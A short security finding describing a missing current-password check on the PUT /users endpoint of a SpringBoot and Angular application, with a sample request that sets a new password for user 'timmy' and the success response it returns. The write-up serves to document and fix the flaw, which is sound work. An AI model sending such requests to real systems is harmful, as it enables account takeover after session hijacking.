# Lack Password Change Validation/Check
It is widely acknowledged that for users to change a password they ought to be questioned for their current password.  This prevents session hijacks from changing the user's password after gaining control.

## Exploitation
**Location:** _PUT /users_

SpringBoot and Angular code lack any validating parameter for the current password. To exploit simply means to change the password as this is exactly what a session hijacker would do.  Below is an exploitation example:

    PUT /users
    raw:
    {
        "newPassword" : "password",
        "username" : "timmy"
    }

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Password updated successfully."
    }
